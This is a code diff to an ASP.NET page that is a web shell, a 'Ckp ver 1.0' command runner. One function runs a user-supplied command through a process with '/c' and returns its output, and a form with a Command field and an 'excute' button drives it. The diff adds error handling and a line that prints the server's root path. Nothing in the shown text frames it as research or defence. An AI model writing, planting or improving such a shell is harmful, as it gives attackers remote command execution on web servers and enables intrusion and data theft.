@@ -4,22 +4,28 @@
 <script Language="c#" runat="server">
 void Page_Load(object sender, EventArgs e)
 {
-	
+
 }
 //Ckp ver 1.0
 string AA(string argA, string argB)
 {
-	ProcessStartInfo Finder = new ProcessStartInfo();
-	Finder.FileName = argA;
-	Finder.Arguments = "/c "+argB;
-	Finder.RedirectStandardOutput = true;
-	Finder.UseShellExecute = false;
-	Process p = Process.Start(Finder);
-	StreamReader stmrdr = p.StandardOutput;
-	string userResp = stmrdr.ReadToEnd();
-	stmrdr.Close();
+	try{
+		ProcessStartInfo Finder = new ProcessStartInfo();
+		Finder.FileName = argA;
+		Finder.Arguments = "/c "+argB;
+		Finder.RedirectStandardOutput = true;
+		Finder.UseShellExecute = false;
+		Process p = Process.Start(Finder);
+		StreamReader stmrdr = p.StandardOutput;
+		string userResp = stmrdr.ReadToEnd();
+		stmrdr.Close();
 
-	return userResp;
+		return userResp;
+	}
+	catch (Exception ex)
+	{
+		Response.Write(Server.HtmlEncode(ex));
+	}
 }
 //Data info
 void YY(object sender, System.EventArgs e)
@@ -43,8 +49,8 @@ void YY(object sender, System.EventArgs e)
 			<asp:Button id="CC" runat="server" Text="excute" OnClick="YY"></asp:Button>
 			<asp:Label id="BB"  runat="server">Command:</asp:Label>
 		</form>
-		<script Language="c#" runat="server">  </script>
+		<script Language="c#" runat="server">  Response.Write(HttpContext.Current.Server.MapPath("~"));  </script>
+
 
 	</body>
 </HTML>
-
